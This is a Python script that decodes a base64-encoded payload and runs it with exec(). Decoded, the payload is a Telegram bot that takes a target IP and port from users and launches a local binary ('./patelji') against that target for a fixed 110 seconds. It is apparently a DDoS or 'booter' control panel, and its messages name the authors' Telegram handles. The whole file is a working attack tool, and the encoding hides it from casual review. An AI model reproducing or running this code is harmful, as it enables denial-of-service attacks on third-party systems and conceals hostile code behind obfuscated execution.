import base64

# Encoded string embedded directly into the script
encoded_script = '''aW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IGxvZ2dpbmcKZnJvbSB0ZWxlZ3JhbSBpbXBvcnQgVXBkYXRlLCBJbmxpbmVLZXlib2FyZEJ1dHRvbiwgSW5saW5lS2V5Ym9hcmRNYXJrdXAKZnJvbSB0ZWxlZ3JhbS5leHQgaW1wb3J0IEFwcGxpY2F0aW9uLCBDb21tYW5kSGFuZGxlciwgTWVzc2FnZUhhbmRsZXIsIENhbGxiYWNrUXVlcnlIYW5kbGVyLCBDb250ZXh0VHlwZXMsIGZpbHRlcnMKZnJvbSBwYXRlbGppaSBpbXBvcnQgVE9LRU4gICMgSW1wb3J0IHRoZSBUT0tFTiB2YXJpYWJsZSAgCiMgU2V0IHVwIGxvZ2dpbmcKbG9nZ2luZy5iYXNpY0NvbmZpZyhmb3JtYXQ9JyUoYXNjdGltZSlzIC0gJShuYW1lKXMgLSAlKGxldmVsbmFtZSlzIC0gJShtZXNzYWdlKXMnLCBsZXZlbD1sb2dnaW5nLklORk8pCgojIFBhdGggdG8geW91ciBiaW5hcnkKQklOQVJZX1BBVEggPSAiLi9wYXRlbGppIgoKIyBHbG9iYWwgdmFyaWFibGVzCnByb2Nlc3MgPSBOb25lCnRhcmdldF9pcCA9IE5vbmUKdGFyZ2V0X3BvcnQgPSBOb25lCmF0dGFja190aW1lID0gMTEwICAjIERlZmF1bHQgYXR0YWNrIHRpbWUgc2V0IHRvIDgwIHNlY29uZHMKCiMgU3RhcnQgY29tbWFuZDogU2hvdyBBdHRhY2sgYnV0dG9uCmFzeW5jIGRlZiBzdGFydCh1cGRhdGU6IFVwZGF0ZSwgY29udGV4dDogQ29udGV4dFR5cGVzLkRFRkFVTFRfVFlQRSk6CiAgICBrZXlib2FyZCA9IFtbSW5saW5lS2V5Ym9hcmRCdXR0b24oIvCfmoBBdHRhY2vwn5qAIiwgY2FsbGJhY2tfZGF0YT0nYXR0YWNrJyldXQogICAgcmVwbHlfbWFya3VwID0gSW5saW5lS2V5Ym9hcmRNYXJrdXAoa2V5Ym9hcmQpCiAgICBhd2FpdCB1cGRhdGUubWVzc2FnZS5yZXBseV90ZXh0KCLwn5qAUHJlc3MgdGhlIEF0dGFjayBidXR0b24gdG8gc3RhcnQgdGhlIGF0dGFjay7wn5qAIiwgcmVwbHlfbWFya3VwPXJlcGx5X21hcmt1cCkKCiMgSGFuZGxlIGJ1dHRvbiBjbGlja3MKYXN5bmMgZGVmIGJ1dHRvbl9oYW5kbGVyKHVwZGF0ZTogVXBkYXRlLCBjb250ZXh0OiBDb250ZXh0VHlwZXMuREVGQVVMVF9UWVBFKToKICAgIHF1ZXJ5ID0gdXBkYXRlLmNhbGxiYWNrX3F1ZXJ5CiAgICBhd2FpdCBxdWVyeS5hbnN3ZXIoKQoKICAgIGlmIHF1ZXJ5LmRhdGEgPT0gJ2F0dGFjayc6CiAgICAgICAgYXdhaXQgcXVlcnkubWVzc2FnZS5yZXBseV90ZXh0KCJCeSBAcGF0ZWxqaV80NyBQbGVhc2UgZW50ZXIgdGhlIHRhcmdldCwgcG9ydCwgYW5kIHRpbWUgaW4gdGhlIGZvcm1hdDo8dGFyZ2V0PiA8cG9ydD4gPHRpbWU+8J+agPCfmoAiKQoKIyBIYW5kbGUgdGFyZ2V0IGFuZCBwb3J0IGlucHV0CmFzeW5jIGRlZiBoYW5kbGVfaW5wdXQodXBkYXRlOiBVcGRhdGUsIGNvbnRleHQ6IENvbnRleHRUeXBlcy5ERUZBVUxUX1RZUEUpOgogICAgZ2xvYmFsIHRhcmdldF9pcCwgdGFyZ2V0X3BvcnQsIGF0dGFja190aW1lCgogICAgaWYgdXBkYXRlLm1lc3NhZ2UgaXMgTm9uZToKICAgICAgICBhd2FpdCB1cGRhdGUuY2FsbGJhY2tfcXVlcnkubWVzc2FnZS5yZXBseV90ZXh0KCJQbGVhc2UgZW50ZXIgdGhlIHRhcmdldCBhbmQgcG9ydCBpbiB0aGUgZm9ybWF0OiA8dGFyZ2V0PiA8cG9ydD7wn5qA8J+agCBodHRwczovL3QubWUvZmxhc2htYWluY2hhbm5lbCIpCiAgICAgICAgcmV0dXJuCgogICAgdHJ5OgogICAgICAgICMgVXNlciBpbnB1dCBpcyBleHBlY3RlZCBpbiB0aGUgZm9ybWF0OiA8dGFyZ2V0PiA8cG9ydD4KICAgICAgICB0YXJnZXQsIHBvcnQgPSB1cGRhdGUubWVzc2FnZS50ZXh0LnNwbGl0KCkKICAgICAgICB0YXJnZXRfaXAgPSB0YXJnZXQKICAgICAgICB0YXJnZXRfcG9ydCA9IGludChwb3J0KQogICAgICAgIAogICAgICAgICMgQXR0YWNrIHRpbWUgaXMgZml4ZWQgdG8gODAgc2Vjb25kcwogICAgICAgIGF0dGFja190aW1lID0gMTEwCgogICAgICAgICMgU2hvdyBTdGFydCBhbmQgUmVzZXQgYnV0dG9ucyBhZnRlciBpbnB1dCBpcyByZWNlaXZlZAogICAgICAgIGtleWJvYXJkID0gWwogICAgICAgICAgICBbSW5saW5lS2V5Ym9hcmRCdXR0b24oIlN0YXJ0IEF0dGFja/CfmoAiLCBjYWxsYmFja19kYXRhPSdzdGFydF9hdHRhY2snKV0sCiAgICAgICAgICAgIyBbSW5saW5lS2V5Ym9hcmRCdXR0b24oIlJlc2V0IEF0dGFja+Kame+4jyIsIGNhbGxiYWNrX2RhdGE9J3Jlc2V0X2F0dGFjaycpXQogICAgICAgIF0KICAgICAgICByZXBseV9tYXJrdXAgPSBJbmxpbmVLZXlib2FyZE1hcmt1cChrZXlib2FyZCkKICAgICAgICBhd2FpdCB1cGRhdGUubWVzc2FnZS5yZXBseV90ZXh0KGYiVGFyZ2V0OiB7dGFyZ2V0X2lwfSwgUG9ydDoge3RhcmdldF9wb3J0fSwgVGltZToge2F0dGFja190aW1lfSBzZWNvbmRzIGNvbmZpZ3VyZWQuXG4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiTm93IGNob29zZSBhbiBhY3Rpb246XG4gaHR0cHM6Ly90Lm1lL3BhdGVsX2ppNDciLCByZXBseV9tYXJrdXA9cmVwbHlfbWFya3VwKQogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgYXdhaXQgdXBkYXRlLm1lc3NhZ2UucmVwbHlfdGV4dCgnJydJbnZhbGlkIGZvcm1hdC4gUGxlYXNlIGVudGVyIGluIHRoZSBmb3JtYXQ6IAo8dGFyZ2V0PiA8cG9ydD7wn5qA8J+agCcnJykKCiMgU3RhcnQgdGhlIGF0dGFjawphc3luYyBkZWYgc3RhcnRfYXR0YWNrKHVwZGF0ZTogVXBkYXRlLCBjb250ZXh0OiBDb250ZXh0VHlwZXMuREVGQVVMVF9UWVBFKToKICAgIGdsb2JhbCBwcm9jZXNzLCB0YXJnZXRfaXAsIHRhcmdldF9wb3J0LCBhdHRhY2tfdGltZQogICAgaWYgbm90IHRhcmdldF9pcCBvciBub3QgdGFyZ2V0X3BvcnQgb3Igbm90IGF0dGFja190aW1lOgogICAgICAgIGF3YWl0IHVwZGF0ZS5jYWxsYmFja19xdWVyeS5tZXNzYWdlLnJlcGx5X3RleHQoIlBsZWFzZSBjb25maWd1cmUgdGhlIHRhcmdldCBhbmQgcG9ydCBmaXJzdC4iKQogICAgICAgIHJldHVybgoKICAgIGlmIHByb2Nlc3MgYW5kIHByb2Nlc3MucG9sbCgpIGlzIE5vbmU6CiAgICAgICAgYXdhaXQgdXBkYXRlLmNhbGxiYWNrX3F1ZXJ5Lm1lc3NhZ2UucmVwbHlfdGV4dCgiQXR0YWNrIGlzIGFscmVhZHkgcnVubmluZy4iKQogICAgICAgIHJldHVybgoKICAgIHRyeToKICAgICAgICAjIFJ1biB0aGUgYmluYXJ5IHdpdGggdGFyZ2V0LCBwb3J0LCBhbmQgdGltZQogICAgICAgIHByb2Nlc3MgPSBzdWJwcm9jZXNzLlBvcGVuKFtCSU5BUllfUEFUSCwgdGFyZ2V0X2lwLCBzdHIodGFyZ2V0X3BvcnQpLCBzdHIoYXR0YWNrX3RpbWUpXSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSkKICAgICAgICBhd2FpdCB1cGRhdGUuY2FsbGJhY2tfcXVlcnkubWVzc2FnZS5yZXBseV90ZXh0KGYiKOKXjyfil6En4pePKSB7dGFyZ2V0X2lwfTp7dGFyZ2V0X3BvcnR9IGZvciB7YXR0YWNrX3RpbWV9IHNlY29uZHMgXG4gRmVlZEJhY2sgc2VuZCDwn5ihIHloYSBwZSA6LSBodHRwczovL3QubWUvcGF0ZWxqaV80NyAgIikgCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgYXdhaXQgdXBkYXRlLmNhbGxiYWNrX3F1ZXJ5Lm1lc3NhZ2UucmVwbHlfdGV4dChmIkVycm9yIHN0YXJ0aW5nIGF0dGFjazoge2V9IFxuIEZpbGVzIGthIG5hbWUgZ2FsdCBoIFxuICBnaXRodWIgbWUgamFrYXIgY2hlayBrcm8gZmlsZXMga2EgbmFtZSBrdWNoIGFpc2EgaG9uYSBjaGFoaXllIPCfkYdcbiBcbiBwYXRlbGppIFxuIHBhdGVsamkucHkgXG4gcGF0ZWxqaWkucHkgXG4gcGF0ZWxqaS5zaCAiKQogICAgICAgIGxvZ2dpbmcuZXJyb3IoZiJFcnJvciBzdGFydGluZyBhdHRhY2s6IHtlfSIpCgojIFJlc2V0IHRoZSBhdHRhY2sKYXN5bmMgZGVmIHJlc2V0X2F0dGFjayh1cGRhdGU6IFVwZGF0ZSwgY29udGV4dDogQ29udGV4dFR5cGVzLkRFRkFVTFRfVFlQRSk6CiAgICBnbG9iYWwgcHJvY2VzcywgdGFyZ2V0X2lwLCB0YXJnZXRfcG9ydCwgYXR0YWNrX3RpbWUKICAgIGlmIHByb2Nlc3MgYW5kIHByb2Nlc3MucG9sbCgpIGlzIE5vbmU6CiAgICAgICAgcHJvY2Vzcy50ZXJtaW5hdGUoKQogICAgICAgIHByb2Nlc3Mud2FpdCgpCgogICAgdGFyZ2V0X2lwID0gTm9uZQogICAgdGFyZ2V0X3BvcnQgPSBOb25lCiAgICBhdHRhY2tfdGltZSA9IDExMCAgIyBSZXNldHRpbmcgYXR0YWNrIHRpbWUgdG8gZGVmYXVsdCA4MCBzZWNvbmRzCiAgICBhd2FpdCB1cGRhdGUuY2FsbGJhY2tfcXVlcnkubWVzc2FnZS5yZXBseV90ZXh0KCJBdHRhY2sgcmVzZXQuIEJ5IGh0dHBzOi8vdC5tZS9GTEFTSF81MDIgUGxlYXNlIGVudGVyIHRoZSB0YXJnZXQgYW5kIHBvcnQgaW4gdGhlIGZvcm1hdDogPHRhcmdldD4gPHBvcnQ+8J+agCIpCgojIEJ1dHRvbiBhY3Rpb24gaGFuZGxlciBmb3Igc3RhcnQvcmVzZXQgYWN0aW9ucwphc3luYyBkZWYgYnV0dG9uX2NhbGxiYWNrX2hhbmRsZXIodXBkYXRlOiBVcGRhdGUsIGNvbnRleHQ6IENvbnRleHRUeXBlcy5ERUZBVUxUX1RZUEUpOgogICAgcXVlcnkgPSB1cGRhdGUuY2FsbGJhY2tfcXVlcnkKICAgIGF3YWl0IHF1ZXJ5LmFuc3dlcigpCgogICAgaWYgcXVlcnkuZGF0YSA9PSAnc3RhcnRfYXR0YWNrJzoKICAgICAgICBhd2FpdCBzdGFydF9hdHRhY2sodXBkYXRlLCBjb250ZXh0KQogICAgZWxpZiBxdWVyeS5kYXRhID09ICdyZXNldF9hdHRhY2snOgogICAgICAgIGF3YWl0IHJlc2V0X2F0dGFjayh1cGRhdGUsIGNvbnRleHQpCgojIE1haW4gZnVuY3Rpb24gdG8gc3RhcnQgdGhlIGJvdApkZWYgbWFpbigpOgogICAgIyBDcmVhdGUgQXBwbGljYXRpb24gb2JqZWN0IHdpdGggeW91ciBib3QncyB0b2tlbgogICAgYXBwbGljYXRpb24gPSBBcHBsaWNhdGlvbi5idWlsZGVyKCkudG9rZW4oVE9LRU4pLmJ1aWxkKCkKCiAgICAjIFJlZ2lzdGVyIGNvbW1hbmQgaGFuZGxlciBmb3IgL3N0YXJ0CiAgICBhcHBsaWNhdGlvbi5hZGRfaGFuZGxlcihDb21tYW5kSGFuZGxlcigic3RhcnQiLCBzdGFydCkpCgogICAgIyBSZWdpc3RlciBidXR0b24gaGFuZGxlcgogICAgYXBwbGljYXRpb24uYWRkX2hhbmRsZXIoQ2FsbGJhY2tRdWVyeUhhbmRsZXIoYnV0dG9uX2hhbmRsZXIsIHBhdHRlcm49J15hdHRhY2skJykpCiAgICBhcHBsaWNhdGlvbi5hZGRfaGFuZGxlcihDYWxsYmFja1F1ZXJ5SGFuZGxlcihidXR0b25fY2FsbGJhY2tfaGFuZGxlciwgcGF0dGVybj0nXihzdGFydF9hdHRhY2t8cmVzZXRfYXR0YWNrKSQnKSkKCiAgICAjIFJlZ2lzdGVyIG1lc3NhZ2UgaGFuZGxlciB0byBoYW5kbGUgaW5wdXQgZm9yIHRhcmdldCBhbmQgcG9ydAogICAgYXBwbGljYXRpb24uYWRkX2hhbmRsZXIoTWVzc2FnZUhhbmRsZXIoZmlsdGVycy5URVhUICYgfmZpbHRlcnMuQ09NTUFORCwgaGFuZGxlX2lucHV0KSkKCiAgICAjIFN0YXJ0IHRoZSBib3QKICAgIGFwcGxpY2F0aW9uLnJ1bl9wb2xsaW5nKCkKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBtYWluKCkK'''

# Decode and execute the script
decoded_script = base64.b64decode(encoded_script).decode('utf-8')
exec(decoded_script)
